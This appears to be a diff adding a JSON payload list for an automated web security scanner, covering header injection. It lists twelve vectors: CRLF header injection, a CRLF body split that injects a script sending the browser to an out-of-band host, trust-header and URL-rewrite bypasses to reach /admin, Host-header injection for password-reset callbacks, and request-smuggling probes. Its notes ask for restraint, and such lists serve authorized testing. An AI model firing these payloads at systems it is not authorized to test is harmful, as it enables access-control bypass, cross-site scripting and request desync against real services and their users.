@@ -1,0 +1,19 @@
+{
+  "class": "header_injection",
+  "order": "bypass-first",
+  "note": "Header-value and path-based tricks. Cache-poisoning probes use harmless markers (X-Cache-Marker: hunterprobe) — never poison with real content.",
+  "payloads": [
+    { "id": "hdr::01", "vector": "%0d%0aX-Hunter-Probe: 1", "note": "CRLF in path/param — reflected header injection (check response headers)" },
+    { "id": "hdr::02", "vector": "%0d%0a%0d%0a<script>location='http://{OOB}'</script>", "note": "CRLF -> body split, stored as reflected XSS via headers" },
+    { "id": "hdr::03", "vector": "X-Forwarded-For: 127.0.0.1", "note": "internal-access trust bypass probe" },
+    { "id": "hdr::04", "vector": "X-Original-URL: /admin", "note": "routing-layer bypass (IIS/front controller)" },
+    { "id": "hdr::05", "vector": "X-Rewrite-URL: /admin", "note": "routing bypass variant" },
+    { "id": "hdr::06", "vector": "X-Forwarded-Host: {OOB}", "note": "host-header injection -> password-reset/SSRF style callbacks" },
+    { "id": "hdr::07", "vector": "X-Forwarded-Proto: https", "note": "mixed-content/redirect trust probe" },
+    { "id": "hdr::08", "vector": "X-Cache-Marker: hunterprobe", "note": "cache-key discovery marker — pair with param variations" },
+    { "id": "hdr::09", "vector": "X-HTTP-Method-Override: PUT", "note": "method override trust probe" },
+    { "id": "hdr::10", "vector": "Content-Length: 0\\r\\n\\r\\nGET /admin HTTP/1.1\\r\\nHost: x", "note": "classic CL.CL smuggling PROBE ONLY — low volume, stop on first confirm" },
+    { "id": "hdr::11", "vector": "Transfer-Encoding: 0", "note": "TE.TE desync probe — pair with timing/CL evidence, keep requests minimal" },
+    { "id": "hdr::12", "vector": "X-Client-IP: 127.0.0.1", "note": "alternative trust headers: X-Real-IP, True-Client-IP, CF-Connecting-IP" }
+  ]
+}
